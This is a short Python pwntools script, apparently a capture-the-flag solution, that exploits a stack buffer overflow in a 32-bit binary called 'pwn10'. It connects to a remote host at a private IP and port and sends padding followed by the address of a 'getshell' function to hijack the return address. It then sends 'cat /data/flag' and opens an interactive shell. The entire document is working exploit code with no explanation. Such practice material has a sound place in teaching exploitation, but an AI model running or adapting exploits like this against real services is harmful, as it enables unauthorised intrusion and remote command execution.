from pwn import *

target = remote('10.214.160.13',11001)
# target = process('./pwn10')

getshell_addr = 0x0804853d

stuff_len = 0x1c+0x4 #format base + return value size

payload = b'a' * stuff_len + p32(getshell_addr)

target.sendline(payload)

target.sendline(b'cat /data/flag')

target.interactive()


